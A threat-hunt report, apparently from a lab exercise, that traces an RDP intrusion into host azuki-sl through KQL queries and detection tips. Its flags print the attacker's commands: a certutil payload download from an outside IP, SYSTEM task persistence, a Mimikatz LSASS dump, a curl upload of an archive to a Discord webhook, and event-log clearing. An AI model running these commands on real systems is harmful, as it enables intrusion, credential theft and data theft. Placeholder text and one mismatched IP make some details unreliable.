
<p align="center">
  <img width="588" height="883" alt="Screenshot 2026-02-13 at 5 02 09 PM" src="https://github.com/user-attachments/assets/3950cd3f-8988-426e-b674-a3f259823e6b" />

</p


# 🛡️ Threat Hunt Report – <Hunt Name>

---

## 📌 Executive Summary

A full-scale intrusion was identified on the AZUKI-SL workstation at Azuki Import/Export Trading Co. The attacker gained unauthorized RDP access using compromised credentials, established persistence, disabled security controls, dumped credentials from LSASS memory, staged and exfiltrated sensitive data via Discord, cleared event logs, and attempted lateral movement to a secondary host. The attack demonstrates coordinated tradecraft across multiple MITRE ATT&CK tactics, including defense evasion, credential access, command and control, and exfiltration. Immediate remediation and enhanced detection engineering are required to prevent recurrence.

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry  
- Correlate attacker behavior to MITRE ATT&CK techniques  
- Document evidence, detection gaps, and response opportunities  

---

## 🧭 Scope & Environment

- **Environment:** Microsoft Defender for Endpoint + Azure Sentinel (KQL)  
- **Data Sources:** DeviceProcessEvents, DeviceFileEvents, DeviceRegistryEvents, DeviceNetworkEvents, DeviceLogonEvents  
- **Timeframe:** 2025-11-19 → 2025-11-20   

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 20](#-flag-20)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

<High-level narrative describing the attack lifecycle, key behaviors observed, and why this hunt matters.>

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | Remote Services (RDP) | T1021.001 | High |
| 2 | Valid Accounts | T1078 | High |
| 3 | Network Discovery | T1046 | Medium |
| 4 | Data Staged | T1074 | High |
| 5 | Impair Defenses | T1562.001 | Critical |
| 6 | Impair Defenses | T1562.001 | Critical |
| 7 | Ingress Tool Transfer | T1105 | High |
| 8 | Scheduled Task | T1053.005 | High |
| 9 | Scheduled Task | T1053.005 | High |
| 10 | Command & Control | T1071.001 | Critical |
| 11 | Command & Control | T1071.001 | Critical |
| 12 | OS Credential Dumping | T1003.001 | Critical |
| 13 | LSASS Memory Dump | T1003.001 | Critical |
| 14 | Archive Collected Data | T1560 | High |
| 15 | Exfiltration Over Web Service | T1567.002 | Critical |
| 16 | Clear Windows Event Logs | T1070.001 | High |
| 17 | Create Local Account | T1136.001 | High |
| 18 | PowerShell Execution | T1059.001 | Medium |
| 19 | Lateral Movement | T1021.001 | High |
| 20 | Remote Desktop | T1021.001 | High |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: INITIAL ACCESS - Remote Access Source<Technique Name></strong></summary>

### 🎯 Objective
Establish unauthorized remote access to the AZUKI-SL workstation using Remote Desktop Protocol (RDP).

### 📌 Finding
An external IP address (**88.97.178.12**) successfully authenticated via RDP to the host **azuki-sl** during the incident timeframe. This connection represents the initial point of compromise.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T18:36:18.503997Z |
| Process | LogonSuccess (RDP session) |
| Parent Process | N/A (Authentication Event) |
| Command Line | N/A (DeviceLogonEvents entry) |

### 💡 Why it matters
Unauthorized RDP access is a common initial access vector. Successful authentication from an external IP indicates credential compromise and direct remote control of the system. This establishes the starting point of the entire attack chain.

### 🔧 KQL Query Used
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where isnotempty(RemoteIP)
| where RemoteIPType == "Public"
| where ActionType == "LogonSuccess"
| project TimeGenerated, AccountName, DeviceName, RemoteIP
```

### 🖼️ Screenshot
<img width="846" height="80" alt="Screenshot 2026-02-14 at 11 38 00 AM" src="https://github.com/user-attachments/assets/80b95ea4-991d-40aa-9059-e80f415bdf4f" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating potential external compromise, filter `DeviceLogonEvents` for `RemoteIPType == "Public"` combined with `ActionType == "LogonSuccess"`. This quickly isolates successful authentications originating from outside the internal network and reduces noise from internal administrative activity.

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: INITIAL ACCESS - Compromised User Account<Technique Name></strong></summary>

### 🎯 Objective
Use valid stolen credentials to authenticate to the target system and establish interactive access.

### 📌 Finding
The account **kenji.sato** successfully authenticated to **azuki-sl** during the unauthorized RDP session originating from external IP **88.97.178.12**. All successful logon events during the initial access window were associated with this account.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T18:36:18.503997Z |
| Account Name | kenji.sato |
| Source IP | 88.87.178.12 |
| ActionType | LogonSuccess |

### 💡 Why it matters
The use of a legitimate account indicates credential compromise rather than exploitation of a software vulnerability. Valid account abuse allows attackers to blend into normal authentication traffic, making detection more difficult and increasing the likelihood of successful lateral movement.

### 🔧 KQL Query Used
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where isnotempty(RemoteIP)
| where RemoteIPType == "Public"
| where ActionType == "LogonSuccess"
| project TimeGenerated, AccountName, DeviceName, RemoteIP
```

### 🖼️ Screenshot
<img width="846" height="80" alt="Screenshot 2026-02-14 at 11 38 00 AM" src="https://github.com/user-attachments/assets/80b95ea4-991d-40aa-9059-e80f415bdf4f" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
After identifying a suspicious external RemoteIP, pivot on the associated AccountName in DeviceLogonEvents to determine which credentials were used and whether the same account was reused across multiple sessions.

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: DISCOVERY - Network Reconnaissance<Technique Name></strong></summary>

### 🎯 Objective
Enumerate internal network neighbors to identify additional systems for lateral movement.

### 📌 Finding
The compromised account **kenji.sato** executed the command: **arp -a**. This command displays the ARP table, revealing IP-to-MAC address mappings for devices on the local subnet.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:04:01.773778Z |
| Process | arp.exe |
| Parent Process | powershell.exe |
| Command Line | arp -a |

### 💡 Why it matters

`arp -a` is commonly used during the discovery phase to identify other systems on the network. This reconnaissance step typically precedes lateral movement attempts, allowing attackers to select high-value targets.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
|project TimeGenerated, AccountName, DeviceName, ActionType, FileName, InitiatingProcessCommandLine ,ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1121" height="175" alt="Screenshot 2026-02-14 at 12 43 23 PM" src="https://github.com/user-attachments/assets/0420872c-57b4-40b2-aada-5d1d856fd4e2" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
After confirming initial access, pivot into DeviceProcessEvents and review ProcessCommandLine activity for common discovery commands such as arp, ipconfig, net view, and route print, especially when executed soon after suspicious remote logins.

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: DEFENCE EVASION - Malware Staging Directory<Technique Name></strong></summary>

### 🎯 Objective
Create a hidden local staging directory to store malicious tools and payloads prior to execution and persistence.

### 📌 Finding
The attacker created and utilized the directory:C:\ProgramData\WindowsCache
This directory was used to store malicious binaries including:

- `svchost.exe` (Persistence / C2 payload)
- `mm.exe` (Credential dumping tool)

The directory name mimics legitimate Windows components to evade detection.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:05:30.755805Z |
| Account | kenji.sato |
| Directory Path | C:\ProgramData\WindowsCache |
| Files Observed | svchost.exe, mm.exe |

### 💡 Why it matters

Attackers frequently create hidden or system-looking directories under `ProgramData` because:

- It is writable by standard users
- It blends in with legitimate system paths
- It avoids immediate suspicion compared to user profile directories

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
|project TimeGenerated, AccountName, DeviceName, ActionType, FileName, InitiatingProcessCommandLine ,ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1357" height="349" alt="Screenshot 2026-02-14 at 12 52 09 PM" src="https://github.com/user-attachments/assets/6b2d10b0-437c-4c86-9f69-b4ea82775394" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating compromise, sort DeviceFileEvents by FolderPath and look for executables running from non-standard directories (e.g., ProgramData, Temp, Public) that mimic legitimate Windows components.

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: DEFENCE EVASION - File Extension Exclusions<Technique Name></strong></summary>

### 🎯 Objective
Modify Windows Defender configuration to exclude specific file extensions from scanning, allowing malicious tools to execute undetected.

### 📌 Finding
The attacker added multiple file extension exclusions under the Windows Defender registry key: **HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions**. A total of **<3>** unique file extensions were excluded from real-time scanning during the attack timeline.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:06:58.6835598Z |
| Registry Key | Windows Defender\Exclusions\Extensions |
| Action | RegistryValueSet |
| Account | kenji.sato |

### 💡 Why it matters

By excluding file extensions, the attacker ensured that Defender would ignore malicious files matching those extensions. This significantly reduced the likelihood of detection for:

- Malware payloads  
- Credential dumping tools  
- Staged archives  
- Scripts  

### 🔧 KQL Query Used
```
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessCommandLine ,PreviousRegistryValueName, RegistryKey, RegistryValueName
```

### 🖼️ Screenshot
<img width="1196" height="228" alt="Screenshot 2026-02-14 at 12 59 33 PM" src="https://github.com/user-attachments/assets/04531520-172b-44d8-9d70-b0e811ba28d4" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating suspicious activity, pivot to DeviceRegistryEvents and filter for registry keys containing Windows Defender\Exclusions. Count distinct RegistryValueName entries to determine the scope of scanning exclusions introduced during the attack.

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: DEFENCE EVASION - Temporary Folder Exclusion<Technique Name></strong></summary>

### 🎯 Objective
Exclude a temporary directory from Windows Defender scanning to allow malware execution and staging without detection.

### 📌 Finding
The attacker added the following path to Windows Defender exclusions: **C:\Users\KENJI~1.SAT\AppData\Local\Temp**. This modification was made under: **HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths**. An additional exclusion was also added for the staging directory: **C:\ProgramData\WindowsCache**

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T18:49:27.6830204Z |
| Registry Key | Windows Defender\Exclusions\Paths |
| RegistryValueName | C:\Users\KENJI~1.SAT\AppData\Local\Temp |
| Account | kenji.sato |

### 💡 Why it matters

The `%Temp%` directory is commonly used by malware to:

- Download payloads  
- Extract archives  
- Execute scripts  
- Stage credential dumping tools  

By excluding this path from Defender scanning, the attacker significantly reduced endpoint visibility and improved the success rate of malicious execution.

This demonstrates deliberate anti-detection behavior and knowledge of Windows security mechanisms.

### 🔧 KQL Query Used
```
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where RegistryKey contains @"Windows Defender\Exclusions\Paths"
| project TimeGenerated, ActionType, DeviceName, PreviousRegistryValueName, RegistryKey
```

### 🖼️ Screenshot
<img width="1115" height="78" alt="Screenshot 2026-02-14 at 1 05 45 PM" src="https://github.com/user-attachments/assets/e0910176-0dc4-436c-86ef-d0067b72282c" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating endpoint compromise, filter DeviceRegistryEvents for Exclusions\Paths and review newly added RegistryValueName entries. Temporary and staging directories are high-risk indicators of defense evasion.

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: DEFENCE EVASION - Download Utility Abuse<Technique Name></strong></summary>

### 🎯 Objective
Download malicious payloads using a built-in Windows binary to evade security controls and avoid introducing obvious third-party tools.

### 📌 Finding
The attacker abused the Windows-native utility:**certutil.exe** to download a malicious executable from an external server:**certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe**. This represents Living-Off-The-Land Binary (LOLBIN) abuse.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:06:58.5778439Z |
| Process | certutil.exe |
| Command Line | "certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe |
| Source URL | [kenji.sato](http://78.141.196.6:8080) |

### 💡 Why it matters

`certutil.exe` is a legitimate Windows tool intended for certificate management. However, attackers commonly abuse the `-urlcache -f` arguments to download malware directly from remote servers.

This technique:
- Avoids introducing obvious download tools
- Blends into normal system binaries
- Evades naive application allowlisting

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where ProcessCommandLine has "http"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img width="1134" height="157" alt="Screenshot 2026-02-14 at 1 18 50 PM" src="https://github.com/user-attachments/assets/16615e01-5bce-40e3-9b75-3f568927a365" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceProcessEvents for native binaries (certutil.exe, bitsadmin.exe, curl.exe) combined with http in ProcessCommandLine. Legitimate enterprise usage of these tools for direct downloads is rare and high-signal for malicious activity.

</details>

---

<details>
<summary id="-flag-8">🚩 <strong> Flag 8: PERSISTENCE - Scheduled Task Name<Technique Name></strong></summary>

### 🎯 Objective
Establish persistence across system reboots by creating a scheduled task that executes malware under SYSTEM privileges.

### 📌 Finding
The attacker created a scheduled task named:**Windows Update Check**. This task was configured to run daily as SYSTEM and execute the malicious binary stored in the staging directory.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:07:46.9796512Z |
| Process | schtasks.exe |
| Command Line | "schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f |
| Account | kenji.sato |

### 💡 Why it matters

Scheduled tasks provide reliable persistence because:

- They survive system reboots  
- They can run under SYSTEM privileges  
- They blend with legitimate Windows maintenance tasks  

The name **“Windows Update Check”** was chosen to mimic legitimate system activity and avoid suspicion.

This confirms deliberate persistence establishment.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where FileName contains "tasks"
| project  TimeGenerated, AccountName, DeviceName, FileName, InitiatingProcessCommandLine, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1404" height="229" alt="Screenshot 2026-02-14 at 1 22 27 PM" src="https://github.com/user-attachments/assets/1051fd79-05e5-4491-89de-3a9bd1cce8f5" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Filter DeviceProcessEvents for FileName == "schtasks.exe" combined with ProcessCommandLine contains "/create" to quickly identify persistence attempts via scheduled task creation.

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: PERSISTENCE - Scheduled Task Target<Technique Name></strong></summary>

### 🎯 Objective
Configure the scheduled task to execute the malicious payload at runtime.

### 📌 Finding
The scheduled task **Windows Update Check** was configured with the following execution target:**C:\ProgramData\WindowsCache\svchost.exe**. This executable is a malicious payload staged earlier via certutil and does not match the legitimate Windows `svchost.exe` location.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:07:46.9796512Z |
| Process | schtasks.exe |
| Command Line | schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM |
| Malicious Path | C:\ProgramData\WindowsCache\svchost.exe |

### 💡 Why it matters

The `/tr` parameter defines what executes when the task runs. By pointing it to: **C:\ProgramData\WindowsCache\svchost.exe** the attacker ensured:

- Execution of malware at scheduled intervals  
- SYSTEM-level privilege execution  
- Persistent command-and-control beaconing  

Legitimate `svchost.exe` resides in:

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where FileName contains "tasks"
| project  TimeGenerated, AccountName, DeviceName, FileName, InitiatingProcessCommandLine, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1404" height="229" alt="Screenshot 2026-02-14 at 1 22 27 PM" src="https://github.com/user-attachments/assets/8eb05557-8c6d-4f8f-967c-26a9c267ae78" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating persistence, extract the /tr parameter from schtasks.exe command lines and validate whether the target executable resides in a legitimate Windows directory.

</details>

---

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: COMMAND & CONTROL - C2 Server Address<Technique Name></strong></summary>

### 🎯 Objective
Establish outbound communication with a remote command-and-control (C2) server to receive instructions and maintain control of the compromised host.

### 📌 Finding
The malicious executable:**C:\ProgramData\WindowsCache\svchost.exe** initiated outbound connections to the external IP: **78.141.196.6**. This IP address was also previously used to host the downloaded malware payload, confirming shared attacker infrastructure.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:11:04.1766386Z |
| Process Path | C:\ProgramData\WindowsCache\svchost.exe |
| Remote IP | 78.141.196.6 |
| Remote Port | 443 |

### 💡 Why it matters

Outbound connections to **78.141.196.6** represent active command-and-control communication.

Key indicators:
- Connection initiated by malware staged in ProgramData
- External IP address
- HTTPS (port 443) used for encrypted communication
- Same infrastructure used earlier for payload delivery

This confirms the system was under active remote control.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where isnotempty(RemoteIP)
| where InitiatingProcessFolderPath contains "windowscache"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessFolderPath, LocalIP,RemoteIP, RemotePort
| order by TimeGenerated 
```

### 🖼️ Screenshot
<img width="1199" height="230" alt="Screenshot 2026-02-14 at 1 34 10 PM" src="https://github.com/user-attachments/assets/e16561fd-799e-4a5e-8b85-337223656f64" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
After identifying a staged malware path, pivot into DeviceNetworkEvents filtering by InitiatingProcessFolderPath to determine whether the binary initiated outbound communication to external infrastructure.

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: COMMAND & CONTROL - C2 Communication Port<Technique Name></strong></summary>

### 🎯 Objective
Maintain encrypted command-and-control communication using a commonly allowed outbound port to evade network-based detection.

### 📌 Finding
The malicious process: **C:\ProgramData\WindowsCache\svchost.exe** communicated with the C2 server **78.141.196.6** over destination port: **443** indicating encrypted HTTPS-based C2 traffic.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:11:04.1766386Z |
| Initiating Process | svchost.exe |
| Process Path | C:\ProgramData\WindowsCache\svchost.exe |
| Remote IP | 78.141.196.6 |
| Remote Port | 443 |
| Protocol | TCP (HTTPS) |

### 💡 Why it matters

Port **443 (HTTPS)** is widely allowed through firewalls and proxies. Attackers commonly use this port to:

- Blend malicious traffic with legitimate web activity  
- Encrypt C2 communications  
- Avoid basic network filtering  

This suggests deliberate evasion by leveraging encrypted application-layer traffic.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where isnotempty(RemoteIP)
| where InitiatingProcessFolderPath contains "windowscache"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessFolderPath, LocalIP,RemoteIP, RemotePort
| order by TimeGenerated 
```

### 🖼️ Screenshot
<img width="1199" height="230" alt="Screenshot 2026-02-14 at 1 34 10 PM" src="https://github.com/user-attachments/assets/a45d848c-78fa-4f3f-84d2-e7f50a5bab1c" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Filter DeviceNetworkEvents by suspicious executable paths and review RemotePort values. Non-browser processes making HTTPS connections to unknown external IPs are strong indicators of command-and-control activity.

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: CREDENTIAL ACCESS - Credential Theft Tool<Technique Name></strong></summary>

### 🎯 Objective
Extract authentication secrets from LSASS memory to obtain plaintext credentials, NTLM hashes, or Kerberos tickets for privilege escalation and lateral movement.

### 📌 Finding
A suspicious executable named: **mm.exe** was executed from the staging directory: **C:\ProgramData\WindowsCache**. This binary was previously downloaded via `certutil.exe` and is consistent with a renamed Mimikatz credential dumping tool.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:08:26.2804285Z |
| Process | mm.exe |
| Process Path | C:\ProgramData\WindowsCache\mm.exe |
| Account | kenji.sato |

### 💡 Why it matters

`mm.exe` is not a legitimate Windows binary and was executed from a non-standard directory. The short filename and staging location strongly indicate a renamed credential dumping tool (commonly Mimikatz).

Credential dumping enables attackers to:
- Extract plaintext passwords  
- Obtain NTLM hashes  
- Perform lateral movement  
- Escalate privileges  

This marks the transition from persistence to credential compromise.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where FolderPath contains "ProgramData"
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1118" height="82" alt="Screenshot 2026-02-14 at 1 41 30 PM" src="https://github.com/user-attachments/assets/7d51b331-4fc5-4724-a7ce-52cf25118ef0" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating staging directories, pivot into DeviceProcessEvents and look for non-standard executables with short or system-mimicking names. Correlate their execution timing with credential access behavior or LSASS interaction.

</details>

---

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: CREDENTIAL ACCESS - Memory Extraction Module<Technique Name></strong></summary>

### 🎯 Objective
Use a specific credential dumping module to extract logon passwords directly from LSASS memory.

### 📌 Finding
The renamed credential dumping tool `mm.exe` was executed with the following arguments: **privilege::debug sekurlsa::logonpasswords exit**. The module used to extract credentials was: **sekurlsa::logonpasswords**

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:08:26.2804285Z |
| Process | mm.exe |
| Process Path | C:\ProgramData\WindowsCache\mm.exe |
| Command Line | "mm.exe" privilege::debug sekurlsa::logonpasswords exit |
| Account | kenji.sato |

### 💡 Why it matters

The module `sekurlsa::logonpasswords` is a well-known Mimikatz command used to:

- Dump plaintext credentials  
- Extract NTLM hashes  
- Retrieve Kerberos tickets  

The inclusion of `privilege::debug` indicates the attacker elevated privileges to access LSASS memory. This confirms deliberate credential harvesting and significantly increases the attacker’s ability to move laterally or escalate privileges.

This is a high-severity credential access technique.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where FolderPath contains "ProgramData"
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1118" height="82" alt="Screenshot 2026-02-14 at 1 41 30 PM" src="https://github.com/user-attachments/assets/a498fc77-e485-461d-aa5a-663272d1e441" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceProcessEvents for ProcessCommandLine containing sekurlsa:: or privilege::debug. These strings are strong indicators of Mimikatz-based credential dumping activity.

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: COLLECTION - Data Staging Archive<Technique Name></strong></summary>

### 🎯 Objective
Compress collected sensitive data into an archive for efficient staging and exfiltration. 

### 📌 Finding
A compressed archive named: **export-data.zip** was created during the collection phase. This file was staged prior to exfiltration and later uploaded to an external cloud service.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:08:58.0244963Z |
| File Name | export-data.zip |
| File Path | C:\ProgramData\WindowsCache\export-data.zip |
| Initiating Account | kenji.sato |

### 💡 Why it matters

Archiving data is a common pre-exfiltration technique used to:

- Consolidate stolen files  
- Reduce transfer size  
- Avoid multiple network uploads  
- Simplify outbound transmission  

The archive name suggests deliberate data collection activity and confirms transition into the exfiltration stage.

This maps to MITRE ATT&CK:

T1560 – Archive Collected Data

### 🔧 KQL Query Used
```
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
| where FileName contains ".zip"
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
```

### 🖼️ Screenshot
<img width="1037" height="176" alt="Screenshot 2026-02-14 at 1 48 33 PM" src="https://github.com/user-attachments/assets/f7abbea8-423b-4cc8-b438-5c4e46e95038" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating data theft, filter DeviceFileEvents for .zip or .rar files created during suspicious activity windows and correlate with outbound DeviceNetworkEvents to confirm staging prior to exfiltration.

</details>

---

<details>
<summary id="-flag-15">🚩 <strong> Flag 15: EXFILTRATION - Exfiltration Channel<Technique Name></strong></summary>

### 🎯 Objective
Exfiltrate stolen data using a legitimate cloud service to blend malicious traffic with normal HTTPS activity.

### 📌 Finding
The attacker used **Discord** as the exfiltration channel. The stolen archive: **export-data.zip** was uploaded via a Discord webhook using: **curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/…**. This confirms data exfiltration over HTTPS to a cloud-hosted service.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:09:21.4234133Z |
| Process | curl.exe |
| Command Line | curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/... |
| Remote Service | discord.com |
| Remote Port | 443 |
| Account | kenji.sato |

### 💡 Why it matters

Discord webhooks are frequently abused because:

- They use encrypted HTTPS (port 443)  
- Traffic blends with legitimate web traffic  
- They require no attacker-controlled infrastructure  
- Data can be uploaded easily using simple HTTP POST requests  

This confirms successful data exfiltration and represents a critical security breach.

This maps to MITRE ATT&CK:

T1567.002 – Exfiltration Over Web Service

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
| where RemotePort == "443"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine, RemoteUrl
```

### 🖼️ Screenshot
<img width="1141" height="107" alt="Screenshot 2026-02-14 at 1 52 38 PM" src="https://github.com/user-attachments/assets/ff6e06c6-f3cd-4968-87b1-c6d80f728314" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceNetworkEvents for InitiatingProcessCommandLine containing -F file=@ combined with external domains. File upload flags are strong indicators of data exfiltration activity.

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: ANTI-FORENSICS - Log Tampering<Technique Name></strong></summary>

### 🎯 Objective
Destroy forensic evidence by clearing Windows event logs to impede investigation and detection.

### 📌 Finding
The attacker executed `wevtutil.exe` to clear Windows event logs in the following order:

1. Security  
2. System  
3. Application  

The first log cleared was: **Security**

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:11:39.0934399Z |
| Process | wevtutil.exe |
| Command Line | wevtutil.exe cl Security |
| Account | kenji.sato |

### 💡 Why it matters

The **Security** log contains:

- Logon events  
- RDP activity  
- Privilege changes  
- Account creation  
- Credential use  

Clearing it first indicates the attacker prioritized removal of authentication and access evidence. This demonstrates awareness of defensive monitoring and deliberate anti-forensic behavior.

This maps to MITRE ATT&CK:

T1070.001 – Clear Windows Event Logs

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
